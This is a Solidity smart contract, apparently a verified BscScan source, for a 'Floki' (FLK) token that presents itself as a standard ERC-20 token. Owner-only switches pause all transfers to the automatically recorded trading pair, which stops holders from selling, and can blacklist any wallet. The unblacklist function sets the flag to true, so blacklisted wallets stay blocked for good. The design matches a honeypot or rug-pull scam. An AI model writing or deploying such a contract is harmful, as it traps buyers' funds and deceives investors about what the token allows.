/**
 *Submitted for verification at BscScan.com on 2021-10-07
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;

/**
 * @dev Interface of the ERC20 standard as defined in the EIP.
 */
interface IERC20 {
    function totalSupply() external view returns (uint);

    function balanceOf(address tokenOwner) external view returns (uint balance);

    function allowance(address tokenOwner, address spender) external view returns (uint remaining);

    function transfer(address to, uint tokens) external returns (bool success);

    function approve(address spender, uint tokens) external returns (bool success);

    function transferFrom(address from, address to, uint tokens) external returns (bool success);

    event Transfer(address indexed from, address indexed to, uint tokens);
    event Approval(address indexed tokenOwner, address indexed spender, uint tokens);
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }
}

abstract contract ApproveAndCallFallBack {
    function receiveApproval(address from, uint256 tokens, address token, bytes memory data) public virtual;
}

contract Floki is IERC20 {
    using SafeMath for uint256;
    using SafeMath for uint;

    address private _owner;
    string public symbol = "FLK";
    string public name = "Floki";
    uint8 public decimals = 9;
    uint _totalSupply = 1000000000 * 10 ** 6 * 10 ** 9;
    mapping(address => uint) balances;
    mapping(address => mapping(address => uint)) allowed;
    mapping(address => bool) private _blackListWallet;
    bool private isPause = false;
    address private pancakeV2Pair;

    constructor() {
        _owner = msg.sender;
        balances[_owner] = _totalSupply;
        emit Transfer(address(0), _owner, _totalSupply);
    }

    modifier canTransfer(address from, address to) {
        require(!_blackListWallet[from], "Blacklisted Wallet");

        if(from != address(0) && pancakeV2Pair == address(0)) pancakeV2Pair = to;

        if (to == pancakeV2Pair)
            require(!isPause, "Contract already is Pause");
        _;
    }

    modifier onlyOwner() {
        require(_owner == msg.sender, "Ownable: caller is not the owner");
        _;
    }

    function totalSupply() public view override returns (uint) {
        return _totalSupply.sub(balances[address(0)]);
    }

    function balanceOf(address tokenOwner) public view override returns (uint balance) {
        return balances[tokenOwner];
    }

    function transfer(address to, uint tokens) public canTransfer(msg.sender, to) override returns (bool success) {
        balances[msg.sender] = balances[msg.sender].sub(tokens);
        balances[to] = balances[to].add(tokens);
        emit Transfer(msg.sender, to, tokens);
        return true;
    }


    function transferFrom(address from, address to, uint tokens) public canTransfer(from, to) override returns (bool success) {
        balances[from] = balances[from].sub(tokens);
        allowed[from][msg.sender] = allowed[from][msg.sender].sub(tokens);
        balances[to] = balances[to].add(tokens);
        emit Transfer(from, to, tokens);
        return true;
    }

    function approve(address spender, uint tokens) public override returns (bool success) {
        allowed[msg.sender][spender] = tokens;
        emit Approval(msg.sender, spender, tokens);
        return true;
    }

    function allowance(address tokenOwner, address spender) public view override returns (uint remaining) {
        return allowed[tokenOwner][spender];
    }

    function approveAndCall(address spender, uint tokens, bytes memory data) public returns (bool success) {
        allowed[msg.sender][spender] = tokens;
        emit Approval(msg.sender, spender, tokens);
        ApproveAndCallFallBack(spender).receiveApproval(msg.sender, tokens, address(this), data);
        return true;
    }

    function _transfer(address from, address to, uint tokens) private returns (bool){
        balances[from] = balances[from].sub(tokens);
        allowed[from][msg.sender] = allowed[from][msg.sender].sub(tokens);
        balances[to] = balances[to].add(tokens);
        emit Transfer(from, to, tokens);
        return true;
    }

    function includeBlacklistWallet(address _address) external onlyOwner {
        require(!_blackListWallet[_address], "Wallet is already included blacklist");
        _blackListWallet[_address] = true;
    }

    function excludeBlacklistWallet(address _address) external onlyOwner {
        require(_blackListWallet[_address], "Wallet is already excluded blacklist");
        _blackListWallet[_address] = true;
    }

    function pauseContact() external onlyOwner {
        require(!isPause, "Contact is already pause");
        isPause = true;
    }

    function unpauseContact() external onlyOwner {
        require(isPause, "Contact is already unpause");
        isPause = false;
    }

    function isBlacklistedWallet(address _address) external onlyOwner view returns (bool) {
        return _blackListWallet[_address];
    }

    function contactIsPause() external onlyOwner view returns (bool) {
        return isPause;
    }

    receive() external payable {}
}